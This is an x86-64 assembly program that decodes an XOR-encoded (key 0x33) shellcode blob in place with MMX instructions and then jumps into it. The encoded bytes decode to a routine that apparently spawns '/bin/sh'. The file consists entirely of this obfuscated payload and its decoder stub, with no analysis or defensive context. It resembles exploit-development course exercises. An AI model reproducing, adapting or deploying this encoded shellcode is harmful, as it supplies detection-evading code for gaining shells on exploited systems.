section .text

global _start

_start:
	jmp short execute
	dec : db 0x33,0x33,0x33,0x33,0x33,0x33,0x33,0x33
	shellcode : db 0xd8,0x22,0x6c,0x7b,0x02,0xf3,0xbb,0x74,0x34,0x7b,0x02,0xc5,0x7b,0x02,0xe1,0x83,0x08,0x3c,0x36,0xdb,0xd9,0xcc,0xcc,0xcc,0x1c,0x51,0x5a,0x5d,0x1c,0x40,0x5b,0x72

; 0x33

execute:
	lea rdi , [rel dec] 
	lea rsi , [rel shellcode]

	xor rcx,rcx
	mov cl,4

decode : 
	movq mm0,qword[rdi]
	movq mm1,qword[rsi]
	pxor mm0,mm1

	movq qword[rsi],mm0
	add rsi,8
	loop decode

	jmp short shellcode
